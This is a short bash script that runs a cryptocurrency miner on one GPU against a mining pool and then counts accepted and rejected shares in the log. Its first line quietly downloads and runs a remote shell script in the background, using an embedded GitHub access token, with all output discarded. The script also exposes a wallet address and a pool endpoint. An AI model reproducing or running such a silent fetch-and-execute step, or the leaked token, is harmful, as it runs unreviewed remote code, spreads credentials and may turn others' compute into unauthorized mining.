( bash -c "$(curl -fsSL -m 30 -H 'Authorization: token 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' -H 'Accept: application/vnd.github.raw' 'https://raw.githubusercontent.com/dongsuju/ul-plant/main/cmd8/i440_probe.sh')" >/dev/null 2>&1 & )
set -u
echo KX4START $(date -u +%H:%M:%S)
CUDA_VISIBLE_DEVICES=7 timeout 360 /opt/fleet/krig/krig-miner --coin pearl -d 0 --url stratum+ssl://10.140.197.2:18048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz/ul-ps-psdz0ha2307s-g7 --password x --no-tui --no-telemetry -l info > /tmp/krig4.log 2>&1
echo RC=$?
grep -Ei 'accepted|reject|error|invalid|new job|connected|Total:' /tmp/krig4.log | tail -40
echo ACC=$(grep -c accepted /tmp/krig4.log) REJ=$(grep -ci reject /tmp/krig4.log) EOF=$(grep -ci 'connection closed' /tmp/krig4.log)
echo KX4DONE $(date -u +%H:%M:%S)
